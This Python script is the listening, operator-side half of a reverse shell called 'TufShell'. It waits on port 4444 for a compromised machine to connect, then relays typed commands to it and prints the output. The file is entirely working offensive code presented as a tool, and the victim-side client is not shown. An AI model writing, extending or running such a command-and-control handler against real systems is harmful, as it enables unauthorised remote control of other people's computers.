import socket
import argparse

def connect(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("Listening...")
    conn, addr = s.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")

    while True:
        command = input("TufShell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())

def main():
    parser = argparse.ArgumentParser(description="TufShell - Reverse Shell")
    parser.add_argument('--ip', type=str, default='0.0.0.0', help='The IP address to listen on')
    parser.add_argument('--port', type=int, default=4444, help='The port to listen on')
    args = parser.parse_args()

    connect(args.ip, args.port)

if __name__ == '__main__':
    main()